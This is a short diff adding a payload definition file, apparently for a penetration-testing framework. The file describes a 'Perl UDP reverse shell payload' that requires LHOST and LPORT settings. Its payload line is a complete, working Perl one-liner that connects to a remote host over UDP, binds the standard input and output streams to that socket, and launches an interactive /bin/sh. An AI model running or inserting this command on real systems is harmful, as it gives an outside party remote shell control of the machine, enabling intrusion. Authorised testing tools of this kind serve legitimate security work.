@@ -1,0 +1,5 @@
+title=Perl UDP reverse shell payload
+info=no extra info needed
+required_opts=LHOST;LPORT
+connector=reverse_udp_netcat
+payload=/usr/bin/env perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
